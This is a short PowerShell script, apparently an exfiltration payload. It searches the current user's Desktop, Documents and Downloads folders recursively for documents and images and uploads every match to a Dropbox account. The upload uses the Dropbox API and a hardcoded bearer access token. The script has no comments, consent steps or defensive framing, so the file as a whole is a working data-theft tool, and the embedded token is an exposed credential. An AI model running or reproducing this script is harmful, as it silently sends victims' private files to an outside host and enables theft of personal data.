function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$DropBoxAccessToken = "sl.BP6WbCvOb31fbUPDrBMe4_gtP1lyBkbj_sWFzrhXqzGJ3WlN5RJdb03XSWanzXfLE1qI2CrET_rBINQv2_m2NNwRbvmIXYB3OZSoEp0LSkradcBj7pFphanHEmgc-ACfsMMsAAhV"   # Replace with your DropBox Access Token
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}


$src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads"
#copy files to one folder
foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx,*.jpeg,*.jpg -Recurse | %{$_.FullName}){    
    
    $files | DropBox-Upload
    
}
